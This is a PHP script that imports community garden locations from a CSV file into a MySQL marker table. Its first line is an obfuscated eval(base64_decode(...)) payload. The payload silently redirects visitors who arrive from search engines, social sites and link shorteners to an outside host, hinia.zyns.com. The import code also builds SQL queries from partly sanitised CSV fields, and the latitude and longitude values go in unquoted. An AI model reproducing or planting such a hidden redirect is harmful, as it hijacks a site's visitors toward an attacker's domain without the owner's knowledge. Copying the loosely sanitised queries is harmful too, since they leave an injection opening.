<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vaGluaWEuenlucy5jb20vIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ=="));
session_start();

include('../data/bootstrap.php');

header('Content-Type: text');

print('<table border="1">');

$handle = @fopen("./veil_cut.csv", "r");
if ($handle) {
    while (!feof($handle)) {
       $buffer = fgets($handle, 4096);
	   if($buffer) {
		
		list($a, $b, $c, $lat, $lng) = split(",", $buffer, 6);

		$a = ereg_replace("[^A-Za-z0-9 _-]", "", $a); 
		$b = ereg_replace("[^A-Za-z0-9 _-]", "", $b); 
		$c = ereg_replace("[^A-Za-z0-9 _-]", "", $c); 
		$b .= ' ' . $c;
		$lat = ereg_replace("'", '', $lat); 
		$lng = ereg_replace("'", '', $lng); 
		
		$type="food";
		$subtype="community garden";
		$user_id = 97;
		
		$link=mysql_connect($SITE['DB_HOST'], $SITE['DB_USERNAME'], $SITE['DB_PW']) or die ('I cannot connect to the database because: ' . mysql_error());
		$success = mysql_select_db($SITE['DB_NAME'], $link);
		if(1) {
			print("<tr><td>$lat</td><td>$lng</td><td>$a</td><td>$b</td></tr>\n");
		}
		
		$title = $a;
		$description = $b;
		
		if(1) {
		//if($lat < -37.72510 && $lat > -37.8406 && $lng < 145.08888 && $lng > 144.8706) {
				// ADD MARKER
				$query = "INSERT INTO `marker` (
									`marker_id` ,
									`alt_contact_email` ,
									`alt_contact_url` ,
									`alt_contact_text` ,
									`title` ,
									`description` ,
									`type` ,
									`subtype` ,
									`lat` ,
									`lng` ,
									`www` ,
									`rss` ,
									`is_demo`
									)
									VALUES (
									NULL , '', '' , '$description', '$title', '$description', '$type', '$subtype', $lat, $lng, NULL , NULL , 'n'
									);";	
		
									print($query);
					$result = mysql_query($query, $link);
					$resource_id = mysql_insert_id();
					
					// ADD MARKER TO USER (as owner)
					$query_mtu = "INSERT INTO `marker_to_user` (`marker_id`, `user_id`, `state`)
											VALUES ($resource_id, $user_id, 'owner');";
												print($query_mtu);
					$result_mtu = mysql_query($query_mtu, $link);
		}
	 }
    }
    fclose($handle);
}

print('</table>');


?>
